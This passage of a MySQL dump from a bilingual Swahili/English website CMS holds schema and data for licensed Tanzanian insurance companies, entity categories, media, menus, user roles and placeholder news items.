(122, 'Zanzibar Insurance Corporstion', '255 242232676', '255 242232676', 'zic@zitec.org', 'Zanzibar', 'P.O.Box 432 Znz', '-', '-', 'Non-Life', '-', 'Perpetual', 1, 'zanzibar-insurance-corporstion', 9, '2022-08-28 02:23:22', '2022-08-28 02:23:22'),
(123, 'UAP Insurance Tanzania Insurance Limited', '255 22 213 7324/5', '255 22 213 7324/5', 'uaptanzania@uap-group.com', 'Dar es Salaam', 'P.O.Box 432  Dsm', 'Mr.Stephen Lokonyo', '-', 'Non-Life', '-', 'Perpetual', 1, 'uap-insurance-tanzania-insurance-limited', 9, '2022-08-28 02:27:08', '2022-08-28 02:27:08'),
(124, 'Jubilee Health Insurance Company of Tanzania Limited', '-', '-', 'enquiry@jubileetanzania.co.tz', 'Dar es Salaam', 'P.O BOX 20524 Dsm', 'Harold Adamson', '-', 'Non-Life', '-', 'Perpetual', 1, 'jubilee-health-insurance-company-of-tanzania-limited', 9, '2022-08-28 02:33:29', '2022-08-28 02:33:29'),
(125, 'Tanzindia Assurance Company Ltd', '255 22 2122914/916', '255 22 2122914/916', 'bima@tanzindia.co.tz', 'Dar es Salaam', 'P.O.Box 70065 Dsm', 'Mr. B. S. Sharma', '-', 'Non-Life', '-', 'Perpetual', 1, 'tanzindia-assurance-company-ltd', 9, '2022-08-28 02:37:11', '2022-08-28 02:37:11'),
(126, 'Sanlam Life Insurance Tanzania Ltd', '255 2127151/2/3', '255 2127151/2/3', 'info@sanlam.co.tz', 'Dar es Salaam', 'P.O.Box 79651 Dsm', 'Mr. Khamis Suleiman', '-', 'Life', '-', 'Perpetual', 1, 'sanlam-life-insurance-tanzania-ltd', 9, '2022-08-28 02:39:52', '2022-08-28 02:39:52'),
(127, 'Resolution Insurance Ltd', '255 22 2210700', '255 22 2210700', 'info@resolution.co.tz', 'Dar es Salaam', 'P.O.Box 105486 Dsm', 'Ms.Maryanne Mugo', '-', 'Non-Life', '-', 'Perpetual', 1, 'resolution-insurance-ltd', 9, '2022-08-28 02:46:33', '2022-08-28 02:46:33'),
(128, 'Mgen Tanzania Insurance Company Ltd', '225 22 2600921/925', '225 22 2600921/925', 'info@mgentanzania.co.tz', 'Dar es Salaam', 'P.O. Box 7495 Dsm', 'Mr. C. Sumbwe', '-', 'Non-Life', '-', 'Perpetual', 1, 'mgen-tanzania-insurance-company-ltd', 9, '2022-08-28 02:58:46', '2022-08-28 02:58:46'),
(129, 'Mayfair Insurance Company Tanzania Limited', '255 2922337/338', '255 2922337/338', 'info@mayfair.co.tz', 'Dar es Salaam', 'P.O.Box 110007 Dsm', 'Mr. Mustafa Rajabali Rashid', '-', 'Non-Life', '-', 'Perpetual', 1, 'mayfair-insurance-company-tanzania-limited', 9, '2022-08-28 03:05:32', '2022-08-28 03:05:32'),
(130, 'Maxinsure Tanzania Limited', '255 22 234 5500', '255 22 234 5500', 'info@maxinsure-tz.com', 'Dar es Salaam', 'P.O.Box 38353 Dsm', 'Mr. Sanjay Singh', '-', 'Non-Life', '-', 'Perpetual', 1, 'maxinsure-tanzania-limited', 9, '2022-08-28 03:07:50', '2022-08-28 03:07:50'),
(131, 'Bumaco Life Insurance Company', '255 27 2753032', '255 27 2753032', 'info@bumacolife.co.tz', 'Moshi', 'P.O.Box 1747 Dsm', 'Mr Samwel Mchopa', '-', 'Life', '-', 'Perpetual', 1, 'bumaco-life-insurance-company', 9, '2022-08-28 03:26:35', '2022-08-28 03:26:35'),
(132, 'Alliance Life Assurance Limited', '255 22 2103300/01', '255 22 2103300/01', 'life@alliancelife.co.tz', 'Dar es Salaam', 'P.O.Box 11522 Dsm', 'Mr. Byford Mutimusakwa', '-', 'Life', '-', 'Perpetual', 1, 'alliance-life-assurance-limited', 9, '2022-08-28 03:32:09', '2022-08-28 03:32:09');

-- --------------------------------------------------------

--
-- Table structure for table `licensed_entity_categories`
--

CREATE TABLE `licensed_entity_categories` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `featured` tinyint(1) NOT NULL DEFAULT 0,
  `specials` int(11) DEFAULT NULL,
  `services` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `licensed_entity_categories`
--

INSERT INTO `licensed_entity_categories` (`id`, `title_sw`, `title_en`, `slug`, `active`, `created_at`, `updated_at`, `featured`, `specials`, `services`) VALUES
(7, 'Insurance Brokers', 'Insurance Brokers', 'insurance-brokers', 1, '2021-09-14 09:36:38', '2022-06-22 15:56:40', 0, NULL, NULL),
(8, 'Insurance Agents', 'Insurance Agents', 'insurance-agents', 1, '2021-09-14 09:38:57', '2022-06-30 15:56:51', 1, NULL, NULL),
(9, 'Insurance Companies', 'Insurance Companies', 'insurance-companies', 1, '2021-10-13 06:40:40', '2022-06-30 15:47:26', 1, NULL, NULL),
(10, 'Loss Adjustors-Assesors', 'Loss Adjustors-Assesors', 'loss-adjustors-assesors', 1, '2022-08-07 08:05:04', '2022-08-07 08:05:04', 0, NULL, NULL),
(11, 'Accredited Reinsurance Companies', 'Accredited Reinsurance Companies', 'accredited-reinsurance-companies', 1, '2022-08-09 16:24:46', '2022-08-09 16:24:46', 0, NULL, NULL),
(12, 'Accredited Reinsurance Brokers', 'Accredited Reinsurance Brokers', 'accredited-reinsurance-brokers', 1, '2022-08-09 16:25:22', '2022-08-09 16:25:22', 0, NULL, NULL),
(13, 'Local Reinsurance Brokers', 'Local Reinsurance Brokers', 'local-reinsurance-brokers', 1, '2022-08-27 12:57:25', '2022-08-27 12:57:25', 0, NULL, NULL),
(14, 'Local Reinsurance Company', 'Local Reinsurance Company', 'local-reinsurance-company', 1, '2022-08-27 13:54:48', '2022-08-27 13:54:48', 0, NULL, NULL),
(15, 'Bancassurance Agency', 'Bancassurance Agency', 'bancassurance-agency', 1, '2022-08-27 14:06:21', '2022-08-27 14:06:21', 0, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `media`
--

CREATE TABLE `media` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_en` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `title_sw` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8_unicode_ci NOT NULL,
  `content_sw` text COLLATE utf8_unicode_ci NOT NULL,
  `mime` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `path` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `url` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `filename` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `iconurl` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `slug` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `gallery_id` int(10) UNSIGNED NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `media`
--

INSERT INTO `media` (`id`, `title_en`, `title_sw`, `content_en`, `content_sw`, `mime`, `path`, `url`, `filename`, `iconurl`, `slug`, `user_id`, `gallery_id`, `status`, `created_at`, `updated_at`) VALUES
(6, '', '', 'We lead in the creation and delivery of services that enable our clients to win in the changing world of work.', 'We lead in the creation and delivery of services that enable our clients to win in the changing world of work.', 'images/jpeg', '/uploads/gallery/', '', 'f3f51bc28896c18c7de96845f2bcd21f.jpeg', '', 'fa1c310e1527b7310444b2226893a2b9-jpeg', 0, 1, 1, '2021-07-30 09:10:56', '2022-10-04 14:22:38'),
(7, '', '', 'We are on a journey to be the trusted performance leader that unleashes the potential of data.', 'We are on a journey to be the trusted performance leader that unleashes the potential of data.', 'images/jpeg', '/uploads/gallery/', '', '8f7ea50336decc43e6eb53e9c1cea593.jpeg', '', '612bcdabb113ed30b94b4b6ea8a67032-jpeg', 0, 1, 1, '2021-07-30 09:12:36', '2022-10-04 14:26:06'),
(19, 'Voluptatem quaerat non architecto ab laudantium modi minima sunt esse temporibus', 'Voluptatem quaerat non architecto ab laudantium modi minima sunt esse temporibus', '', '', '', '', 'https://www.youtube.com/watch?v=xP76q3quHb0', '', '', 'good-video-very-very-nice', 0, 4, 1, '2021-08-04 03:27:11', '2022-10-19 01:16:54'),
(20, 'Veritatis obcaecati tenetur iure eius earum ut molestias', 'Veritatis obcaecati tenetur iure eius earum ut molestias', '', '', '', '', 'https://www.youtube.com/watch?v=wHWbZmg2hzU', '', '', 'good-music', 0, 4, 1, '2021-08-04 03:27:44', '2022-10-19 01:13:57'),
(21, 'Possimus quis earum veniam  quasi aliquam eligendi, placeat qui corporis!', 'Possimus quis earum veniam  quasi aliquam eligendi, placeat qui corporis!', '', '', '', '', 'https://www.youtube.com/watch?v=wLLAWiOfukk', '', '', 'real-possibilities-on-enhancement-of-the-achievable-estimates', 0, 4, 1, '2021-08-04 03:28:21', '2022-10-19 01:15:23'),
(22, 'Consectetur adipisicing consectetur adipisicing consectetur adipisicing', 'Consectetur adipisicing consectetur adipisicing consectetur adipisicing', '', '', '', '', 'https://www.youtube.com/watch?v=vHonWT6849A', '', '', 'management-team', 0, 4, 1, '2021-08-04 03:28:45', '2022-10-19 01:13:05'),
(34, '', '', '“To make digital bright and the human experience brighter.”', '“To make digital bright and the human experience brighter.”', 'images/jpeg', '/uploads/gallery/', '', 'cdcff88f8ced3f0fc0959fe8448c4166.jpeg', '', 'cdcff88f8ced3f0fc0959fe8448c4166-jpeg', 0, 1, 1, '2022-10-04 14:13:46', '2022-10-04 14:13:46'),
(35, '', '', 'Lorem ipsum dolor sit amet consectetur adipisicing elit.', 'Lorem ipsum dolor sit amet consectetur adipisicing elit.', 'images/jpeg', '/uploads/gallery/', '', '2ab76120eade1e2a4699c43fb30f7a74.jpeg', '', '2ab76120eade1e2a4699c43fb30f7a74-jpeg', 0, 3, 1, '2022-10-19 01:09:49', '2022-10-19 01:09:49'),
(36, '', '', 'Lorem ipsum dolor sit amet consectetur adipisicing elit.', 'Lorem ipsum dolor sit amet consectetur adipisicing elit.', 'images/jpeg', '/uploads/gallery/', '', '998c8395552ec680debbc06bf8557bfe.jpeg', '', '998c8395552ec680debbc06bf8557bfe-jpeg', 0, 3, 1, '2022-10-19 01:10:09', '2022-10-19 01:10:09'),
(37, '', '', 'consectetur adipisicing Lorem ipsum dolor adipisicing elit.', 'consectetur adipisicingLorem ipsum dolor sit amet  elit.', 'images/jpeg', '/uploads/gallery/', '', '697a72eeac98132cf3a487cfa186d0ee.jpeg', '', '697a72eeac98132cf3a487cfa186d0ee-jpeg', 0, 3, 1, '2022-10-19 01:10:43', '2022-10-19 01:10:43');

-- --------------------------------------------------------

--
-- Table structure for table `media_links`
--

CREATE TABLE `media_links` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `link` tinyint(4) DEFAULT NULL,
  `url_external` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT 0,
  `position` int(11) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `media_links`
--

INSERT INTO `media_links` (`id`, `title_sw`, `title_en`, `url`, `link`, `url_external`, `active`, `created_at`, `updated_at`, `parent`, `position`) VALUES
(1, 'Press Releases', 'Press Releases', 'press-releases', NULL, NULL, 1, '2021-07-28 06:16:15', '2022-06-22 13:45:18', 0, 5),
(2, 'Hotuba', 'Speeches', 'speeches', NULL, NULL, 1, '2021-07-28 06:16:48', '2022-06-22 13:45:18', 0, 1),
(4, 'Magazines', 'Magazines', 'publications/magazines', NULL, NULL, 1, '2021-07-28 06:17:43', '2022-06-22 13:45:18', 0, 4),
(5, 'News in Brief', 'News in Brief', 'news', NULL, NULL, 1, '2021-07-28 06:18:04', '2022-06-22 13:45:18', 0, 2),
(7, 'Maktaba ya Video', 'Video Gallery', 'galleries/listing/videos', NULL, NULL, 1, '2022-06-22 13:43:29', '2022-06-22 13:45:18', 0, 3),
(8, 'Maktaba ya Picha', 'Photo Gallery', 'galleries/listing/photos', NULL, NULL, 1, '2022-06-22 13:43:29', '2022-06-22 13:45:18', 0, 3);

-- --------------------------------------------------------

--
-- Table structure for table `menus`
--

CREATE TABLE `menus` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `category` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'main_nav',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `menus`
--

INSERT INTO `menus` (`id`, `title_sw`, `title_en`, `status`, `category`, `created_at`, `updated_at`) VALUES
(1, 'Top Menu', 'Top Menu', 1, 'top_menu', '2021-07-28 05:15:07', '2021-10-29 09:46:29'),
(4, 'Footer Menu', 'Footer Menu', 1, 'footer_menu', '2021-08-10 03:45:27', '2021-08-10 03:45:27'),
(8, 'Main Menu', 'Main Menu', 1, 'main_nav', '2022-03-07 10:24:00', '2022-03-07 10:24:00');

-- --------------------------------------------------------

--
-- Table structure for table `menu_items`
--

CREATE TABLE `menu_items` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `menu_id` int(10) UNSIGNED NOT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` tinyint(1) NOT NULL DEFAULT 1,
  `parent` int(10) UNSIGNED NOT NULL,
  `position` int(10) UNSIGNED NOT NULL,
  `has_sidebar` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `menu_items`
--

INSERT INTO `menu_items` (`id`, `title_sw`, `title_en`, `status`, `menu_id`, `url`, `url_external`, `link`, `parent`, `position`, `has_sidebar`, `created_at`, `updated_at`) VALUES
(2, 'Wasiliana Nasi', 'Contact Us', 1, 1, 'contacts', NULL, 1, 0, 4, 0, '2021-07-28 05:43:18', '2022-06-22 13:30:44'),
(4, 'Maswali yanayo ulizwa mara kwa mara', 'FAQs', 1, 1, 'faqs', NULL, 1, 0, 2, 0, '2021-07-28 05:44:26', '2022-08-24 11:17:23'),
(5, 'Malalamiko', 'Complaints', 1, 1, 'http://tiramis.tira.go.tz', 'http://tiramis.tira.go.tz', 0, 0, 3, 0, '2021-07-28 05:44:47', '2022-08-24 11:09:22'),
(12, 'Ramani', 'Sitemap', 1, 4, 'sitemap', NULL, 1, 0, 1, 0, '2021-08-10 03:46:19', '2022-02-07 06:59:30'),
(14, 'Vigezo na Masharti', 'Terms and Conditions', 1, 4, '#', NULL, 1, 0, 2, 0, '2021-08-10 04:01:43', '2022-02-07 06:59:30'),
(15, 'Hakimiliki', 'Copyright Statement', 1, 4, '#', NULL, 1, 0, 3, 0, '2021-08-10 04:01:59', '2022-02-07 06:59:30'),
(16, 'Kanusho', 'Disclaimer', 1, 4, '#', NULL, 1, 0, 4, 0, '2021-08-10 04:03:00', '2022-02-07 06:59:30'),
(87, 'Maktaba ya Picha', 'Media Centre', 1, 8, '#', NULL, 1, 0, 6, 0, '2022-03-07 10:35:20', '2022-10-15 17:11:47'),
(92, 'Photo Gallery', 'Photo Gallery', 1, 8, 'galleries/listing/photos', NULL, 1, 87, 1, 0, '2022-03-07 10:36:21', '2022-10-15 17:11:47'),
(93, 'Video Gallery', 'Video Gallery', 1, 8, 'galleries/listing/videos', NULL, 1, 87, 2, 0, '2022-03-07 10:36:33', '2022-10-15 17:11:47'),
(158, 'Kuhusu Sisi', 'About Us', 1, 8, 'pages/about-us', NULL, 1, 0, 1, 0, '2022-10-15 16:54:45', '2022-10-15 17:11:56'),
(159, 'Projects', 'Projects', 1, 8, 'projects', NULL, 1, 0, 2, 0, '2022-10-15 16:55:51', '2022-10-15 17:11:47'),
(160, 'Jamii', 'Community', 1, 8, '#', NULL, 1, 0, 5, 0, '2022-10-15 16:56:19', '2022-10-15 17:11:47'),
(161, 'Schools', 'Schools', 1, 8, 'communities/schools', NULL, 1, 160, 2, 0, '2022-10-15 16:56:34', '2022-10-15 17:11:47'),
(162, 'Universities', 'Universities', 1, 8, 'communities/universities', NULL, 1, 160, 1, 0, '2022-10-15 16:56:44', '2022-10-15 17:11:47'),
(163, 'Members', 'Members', 1, 8, 'administration/tira-leaders', NULL, 1, 0, 3, 0, '2022-10-15 16:57:54', '2022-10-15 17:11:47'),
(164, 'Habari', 'News', 1, 8, 'news', NULL, 1, 0, 4, 0, '2022-10-15 16:59:00', '2022-10-15 17:11:47');

-- --------------------------------------------------------

--
-- Table structure for table `migrations`
--

CREATE TABLE `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(68, '2020_06_14_082300_permission', 1);

-- --------------------------------------------------------

--
-- Table structure for table `model_has_permissions`
--

CREATE TABLE `model_has_permissions` (
  `permission_id` bigint(20) UNSIGNED NOT NULL,
  `model_type` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `model_id` bigint(20) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `model_has_roles`
--

CREATE TABLE `model_has_roles` (
  `role_id` bigint(20) UNSIGNED NOT NULL,
  `model_type` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `model_id` bigint(20) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `model_has_roles`
--

INSERT INTO `model_has_roles` (`role_id`, `model_type`, `model_id`) VALUES
(1, 'App\\Models\\User', 1),
(1, 'App\\Models\\User', 3),
(2, 'App\\Models\\User', 2),
(2, 'App\\Models\\User', 4);

-- --------------------------------------------------------

--
-- Table structure for table `more_infos`
--

CREATE TABLE `more_infos` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `item_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `more_infos`
--

INSERT INTO `more_infos` (`id`, `title_sw`, `title_en`, `summary_sw`, `summary_en`, `content_sw`, `content_en`, `active`, `item_name`, `user_id`, `slug`, `photo_url`, `created_at`, `updated_at`) VALUES
(1, 'About TIRA', 'About TIRA', '', NULL, NULL, NULL, 1, 'about-tira', 1, 'about-tira', '5f0814d557088a67edbbe7b8a2ea1fa5.jpeg', '2021-08-02 02:58:21', '2022-06-21 03:54:30'),
(2, 'Consumer Services', 'Consumer Services', '', NULL, NULL, NULL, 1, 'consumer-services', 1, 'Consumer Services', '19c85af6feaf700d95b0653f677ebdf9.jpeg', '2021-09-02 02:58:21', '2022-06-21 03:53:48'),
(3, 'Licensed Entities', 'Licensed Entities', '', NULL, NULL, NULL, 1, 'licensed-entities', 1, 'licensed-entities', '295ef015dd5970f514a905c3dd448b42.jpeg', '2021-09-02 02:58:21', '2022-08-07 13:20:41'),
(4, 'Public Relations', 'Public Relations', '', NULL, NULL, NULL, 1, 'public-relations', 1, 'public-relations', '0827f01aa035a8bd7cd2e301c92b31f8.jpeg', '2022-01-02 02:58:21', '2022-08-24 11:23:06'),
(6, 'Members, meet esteemed Coders', 'Members, meet Our esteemed Coders', NULL, NULL, '<p>eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit,</p>', '<p>eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit,</p>', 1, 'members-section', 1, NULL, NULL, '2022-08-10 17:16:50', '2022-10-17 01:40:50'),
(7, 'Swahili Coder Projects & Information Systems', 'Swahili Coder Projects & Information Systems', NULL, NULL, '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur&nbsp;&nbsp;</p>', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur&nbsp;&nbsp;</p>', 1, 'projects-section', 1, NULL, NULL, '2022-08-10 17:19:18', '2022-10-16 09:12:32'),
(8, 'Keeping up with Swahili Coders, Latest News', 'Keeping up with Swahili Coders, Latest News', NULL, NULL, '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium</p>', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium&nbsp;</p>', 1, 'news-section', 1, NULL, NULL, '2022-08-10 17:22:17', '2022-10-16 09:11:38'),
(9, 'Our Partners Across the World', 'Our Partners Across the World', NULL, NULL, '<p>eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error,</p>', '<p>eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error,</p>', 1, 'partners-section', 1, NULL, NULL, '2022-08-10 20:39:10', '2022-10-17 14:36:20'),
(10, 'Swahili Coders Community', 'Swahili Coders Community', NULL, NULL, '<p>harum nesciunt ipsum debitis quas aliquid. Reprehenderit, quia. Quo neque error repudiandae fuga? Ipsa laudantium molestias eos sapiente officiis modi at sunt excepturi expedita sint? Sed quibusdam recusandae alias error harum maxime adipisci amet laborum. Perspiciatis minima nesciunt dolorem! Officiis iure rerum voluptates a cumque velit quibusdam sed amet tempora. Sit laborum ab, eius fugit doloribus tenetur fugiat, temporibus enim commodi iusto libero magni&nbsp;&nbsp;</p>', '<p>harum nesciunt ipsum debitis quas aliquid. Reprehenderit, quia. Quo neque error repudiandae fuga? Ipsa laudantium molestias eos sapiente officiis modi at sunt excepturi expedita sint? Sed quibusdam recusandae alias error harum maxime adipisci amet laborum. Perspiciatis minima nesciunt dolorem! Officiis iure rerum voluptates a cumque velit quibusdam sed amet tempora. Sit laborum ab, eius fugit doloribus tenetur fugiat, temporibus enim commodi iusto libero magni&nbsp;&nbsp;</p>', 1, 'community-section', 1, NULL, NULL, '2022-08-10 20:39:10', '2022-10-17 01:55:28');

-- --------------------------------------------------------

--
-- Table structure for table `news`
--

CREATE TABLE `news` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `user_id` int(11) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `news`
--

INSERT INTO `news` (`id`, `title_sw`, `title_en`, `summary_sw`, `summary_en`, `content_sw`, `content_en`, `active`, `user_id`, `slug`, `photo_url`, `created_at`, `updated_at`) VALUES
(8, 'Veritatis obcaecati tenetur iure Provident similique accusantium nemo autem.', 'Veritatis obcaecati tenetur iure Provident similique accusantium nemo autem.', '', NULL, '<p>nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit, quia. Quo neque error repudiandae fuga? Ipsa laudantium molestias eos sapiente officiis modi at sunt excepturi expedita sint? Sed quibusdam recusandae alias error harum maxime adipisci amet laborum. Perspiciatis minima nesciunt dolorem! Officiis iure rerum voluptates a cumque velit</p>', '<p>nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit, quia. Quo neque error repudiandae fuga? Ipsa laudantium molestias eos sapiente officiis modi at sunt excepturi expedita sint? Sed quibusdam recusandae alias error harum maxime adipisci amet laborum. Perspiciatis minima nesciunt dolorem! Officiis iure rerum voluptates a cumque velit</p>', 1, 1, 'rais-mwinyi-ailekeza-tira-kutekeleza-mabidiliko-ya-sheria-ya-fedha', 'd00101c9c7a7b28f5be48bdc755c021b.jpeg', '2022-08-13 19:52:32', '2022-10-17 01:36:08'),
(9, 'Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure', 'Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure', '', NULL, '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit,</p>', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit,</p>', 1, 1, 'rais-mwinyi-aielekeza-tira-kutekeleza-mabidiliko-ya-sheria-ya-fedha', '74712faa8badcfaddaab5ea83be28301.jpeg', '2022-08-14 17:10:59', '2022-10-17 01:35:16'),
(10, 'voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit,', 'voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit,', '', NULL, '<p style=\"text-align:justify\">Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit,<span style=\"font-size:11pt\"><span style=\"font-family:Calibri,sans-serif\"><span style=\"font-size:12.0pt\"> </span></span></span></p>', '<p style=\"text-align:justify\">Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. 